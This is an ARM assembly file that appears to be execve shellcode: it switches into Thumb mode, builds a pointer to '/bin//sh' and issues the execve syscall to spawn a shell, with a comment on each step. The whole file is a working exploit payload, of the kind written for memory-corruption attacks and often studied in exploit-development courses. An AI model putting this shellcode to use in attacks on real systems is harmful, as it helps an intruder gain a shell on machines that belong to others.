.section .text
.global _start
_start:
    .code 32
    @ thurn thumb mode on
    add     r3, pc, #1
    bx      r3

    .code 16
    mov     r0, pc
    add     r0, #10 	@ pc-relative addressing so we can have a pointer to /bin//sh string
    str     r0, [sp, #4] @ in r0 we have still the pointer to "/bin//sh"
    add     r1, sp, #4 @ save a pointer to a pointer to "/bin//sh"
    sub     r2, r2, r2 @ null
    mov     r7, #11 	@syscall for execve
    svc     1            

.asciz "/bin//sh"

